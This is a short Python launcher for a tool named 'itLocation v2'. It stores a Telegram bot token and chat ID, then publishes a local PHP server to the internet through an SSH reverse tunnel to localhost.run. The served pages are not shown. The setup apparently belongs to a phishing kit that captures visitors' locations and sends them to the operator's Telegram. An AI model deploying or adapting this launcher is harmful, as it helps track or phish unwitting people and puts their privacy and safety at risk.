#/usr/bin/env python3
# code by it4min
# itLocation v2
# t.me/LinuxArmy

import os
os.system("clear")
print(''' \033[92m
                 '&&&&&&&'
                '&&&&&&&&&'
               '&&&&&&&&&&&'
               "&&&'   '&&&"
              "&&&&,   ,&&&&"    Code by it4min
              "&&&&&&&&&&&&&"    -----------------
               "&&&&&&&&&&&"     t.me/LinuxArmy
                "&&&&&&&&&"
                 "&&&&&&&" 
                  "&&&&&"
                   "&&&"
                    "&"  \033[95m
    #####################################

''')
open('bot-data.txt', 'w').close()
token = input("Enter the robot token: ")
chat_id = input("Enter your chat ID: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("php -S localhost:8080 | ssh -R 80:localhost:8080 ssh.localhost.run")


